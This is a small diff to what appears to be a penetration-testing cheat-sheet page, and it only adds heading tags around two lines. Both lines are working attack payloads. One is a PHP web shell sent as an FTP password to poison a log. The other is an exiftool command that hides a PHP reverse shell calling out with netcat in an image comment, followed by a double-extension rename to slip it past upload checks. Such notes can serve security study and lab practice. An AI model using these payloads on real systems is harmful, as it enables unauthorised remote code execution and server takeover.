@@ -62,7 +62,7 @@ Connected to 192.168.1.3.
 <br>
 331 Please specify the password.
 <br>
-Password: <?php system($_GET['cmd']); ?>
+<h3>Password: <?php system($_GET['cmd']); ?></h3>
 <br>
 530 Login incorrect.
 <br>
@@ -74,7 +74,7 @@ ftp>
 <br>
 By a image :
 <br>
-exiftool -Comment='<?php system("nc -e /bin/bash 192.168.1.2 443"); ?>' filename.png
+<h3>exiftool -Comment='<?php system("nc -e /bin/bash 192.168.1.2 443"); ?>' filename.png</h3>
 <br>
 mv filename.png filename.php.png
 <br>
